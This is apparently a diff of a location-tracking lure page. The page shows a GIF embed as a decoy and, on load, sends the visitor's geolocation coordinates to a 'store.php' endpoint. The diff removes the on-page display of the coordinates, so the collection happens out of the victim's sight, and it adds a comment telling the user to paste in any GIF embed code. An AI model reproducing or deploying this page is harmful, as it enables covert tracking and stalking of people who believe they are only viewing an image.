@@ -2,9 +2,13 @@
 <!DOCTYPE html>
 <html>
 <body onload="getLocation()">
-<iframe src="$You'er chossing GFT url$" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/refinery29-annasudit-l0NhXWFmzC9aB8uXK">via GIPHY</a></p>
+ #you can pest Embed GIF coped code
+<iframe src="You'er chossing GFT url$" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="">via GIPHY</a></p>
 
 <p id="demo"></p>
+
+
+
 
 <script>
 const x = document.getElementById("demo");
@@ -21,8 +25,6 @@ function showPosition(position) {
     var xhttp = new XMLHttpRequest();
      xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
      xhttp.send();
-     x.innerHTML = "Latitude: " + position.coords.latitude +
-  "<br>Longitude: " + position.coords.longitude;
 }
 </script>
 
